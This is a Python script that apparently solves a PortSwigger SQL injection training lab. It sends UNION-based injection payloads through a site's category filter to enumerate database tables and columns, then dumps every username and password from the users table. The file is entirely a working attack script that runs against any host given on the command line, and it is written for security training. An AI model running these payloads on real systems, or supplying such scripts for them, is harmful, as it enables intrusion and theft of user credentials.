"""
https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
"""

import sys
import requests
from bs4 import BeautifulSoup
import re

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

category_string = f"' UNION SELECT table_name,null from information_schema.tables --"
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
user_table = soup.find('table').find('th',text=re.compile('^users')).text
print(f"Found user table of {user_table}")

category_string = f"' UNION SELECT column_name,null from information_schema.columns WHERE table_name='{user_table}' --"
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
username_col = soup.find('table').find('th',text=re.compile('^username')).text
password_col = soup.find('table').find('th',text=re.compile('^password')).text
print(f"Found username column of {username_col}")
print(f"Found password column of {password_col}")

category_string = f"' UNION SELECT {username_col},{password_col} from {user_table} -- "
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)
print(resp.text)